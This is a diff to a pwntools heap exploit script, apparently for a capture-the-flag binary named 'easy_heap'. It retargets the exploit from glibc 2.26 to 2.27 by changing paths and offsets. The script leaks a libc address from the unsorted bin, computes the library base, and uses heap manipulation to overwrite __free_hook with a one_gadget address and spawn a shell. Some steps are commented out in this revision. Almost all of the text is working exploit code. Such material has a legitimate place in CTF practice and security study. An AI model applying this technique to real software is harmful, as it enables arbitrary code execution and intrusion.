@@ -1,4 +1,3 @@
-#! -- codeing: utf-8 --
 from pwn import *
 context(os="linux", arch="amd64")
 
@@ -8,10 +7,10 @@ LOCAL = 1
 def debug_on():
 	context.log_level = "debug"
 
-ld_name = "/glibc/2.26/64/lib/ld-2.26.so"
+ld_name = "/glibc/2.27/64/lib/ld-2.27.so"
 g_fname = "./easy_heap"
 g_elf = ELF(g_fname)
-g_libcname =  "/glibc/2.26/64/lib/libc-2.26.so" if LOCAL else "./libc64.so"
+g_libcname =  "/glibc/2.27/64/lib/libc-2.27.so" if LOCAL else "./libc64.so"
 
 if (LOCAL):
 	g_io = process([ld_name, g_fname])
@@ -91,8 +90,8 @@ def pwn():
 	# leak
 	show(0)
 	addr_ub = u64(rl()[:-1].ljust(8, b'\0'))
-	g_libc.address = addr_ub - 88 - 0x3abc20
-	off_one_gadget = 0x40c82 if LOCAL else 0x4f2c5
+	g_libc.address = addr_ub - 96 -  0x3afc40
+	off_one_gadget = 0xdeec2 if LOCAL else 0x4f2c5
 	one_gadget = g_libc.address + off_one_gadget 
 	log.success("unsortedbin@%#x\nlibc@%#x\none_gadget@%#x", addr_ub, g_libc.address, one_gadget)
 
@@ -107,12 +106,15 @@ def pwn():
 	delete(0)
 	delete(9)
 
+	# add(0x8, p64(g_libc.symbols["__realloc_hook"])) # idx=0
 	add(0x8, p64(g_libc.symbols["__free_hook"])) # idx=0
 	add(0x8, "none")		# idx=1
-	add(0x8, p64(one_gadget))
+	# cannot read '\x00', so only the first 6 bytes of one_gadget will be read.
+	# add(0x10, p64(one_gadget) + p64(g_libc.symbols["realloc"] + 2))
 
 	# trigger one_gadget
 	delete(1)
+	# add(0x20, "getshell")
 
 if ("__main__" == __name__):
 	debug_on()
